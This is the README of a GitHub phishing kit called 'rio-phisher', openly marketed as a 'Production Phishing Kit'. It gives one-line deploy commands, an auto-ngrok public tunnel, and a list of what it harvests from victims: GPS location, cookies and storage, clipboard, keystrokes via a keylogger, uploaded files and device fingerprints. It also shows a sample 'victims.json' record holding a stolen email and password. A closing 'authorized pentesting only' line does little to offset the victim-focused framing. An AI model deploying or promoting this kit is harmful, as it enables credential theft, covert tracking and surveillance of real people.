# 🐟 rio-phisher - Production Phishing Kit

**Multi-platform** (Windows/Linux/Android/Termux) phishing server. **Zero dependencies**, **auto-ngrok**, captures **everything**.

## 🚀 1-Click Deploy

```git clone https://github.com/riology/rio-phisher.git cd rio-phisher python-installer.py python-run.py```





**🎯 Captures:**
- 📍 GPS Location (high accuracy)  
- 💾 localStorage/sessionStorage/cookies
- 📋 Clipboard content
- 🔑 Keystrokes (keylogger)
- 📎 File uploads
- 👤 Device fingerprint (UA, screen, timezone)
- 🌐 Public ngrok tunnel
- 📊 Output: `data/victims.json`

**Sample victim data:**\
```{ "ip": "1.2.3.4", "geolocation": {"lat": 40.7128, "lon": -74.0060},``` <br> ```"credentials": {"email": "victim@gmail.com", "password": "P@ssw0rd123"} }```





**🛠️ Platforms Tested:**
- ✅ Windows 10/11 (auto-ngrok)
- ✅ Termux/Android (pkg auto-install)  
- ✅ Linux (curl auto-download)
- ✅ macOS (universal)

*For authorized pentesting only.*
